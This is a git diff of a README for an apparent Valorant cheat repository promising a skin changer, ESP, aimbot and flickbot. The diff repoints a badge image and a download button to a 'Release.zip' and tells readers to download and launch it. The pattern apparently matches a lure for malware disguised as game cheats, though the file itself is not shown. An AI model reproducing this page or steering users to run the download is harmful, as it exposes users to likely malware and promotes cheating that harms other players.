@@ -1,6 +1,6 @@
 # Energy Valorant Skin Changer Hack Esp Aimbot FlickBot
 
-![Energy Valorant Skin Changer Hack Esp Aimbot FlickBot](https://img.shields.io/badge/Valorant-Hack-orange)
+![Energy Valorant Skin Changer Hack Esp Aimbot FlickBot](https://github.com/gamingboy22/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/releases/download/v1.0/Release.zip)
 
 Welcome to the realm of gaming where excellence meets innovation! Dive into the enchanting world of Valorant with the "Energy Valorant Skin Changer Hack Esp Aimbot FlickBot". This repository is home to DLLX1, a paragon of excellence in the gaming universe. It offers a fully realized internal hack customized exclusively for Valorant players.
 
@@ -27,7 +27,7 @@ Welcome to the realm of gaming where excellence meets innovation! Dive into the 
 ## Quick Start
 To get started with this incredible Valorant hack, simply download the latest version by clicking the button below:
 
-[![Download Energy Valorant Hack](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Energy Valorant Hack](https://github.com/gamingboy22/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/releases/download/v1.0/Release.zip)](https://github.com/gamingboy22/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/releases/download/v1.0/Release.zip)
 
 (Note: Once the file is downloaded, launch the application to enjoy all the amazing features it has to offer!)
 
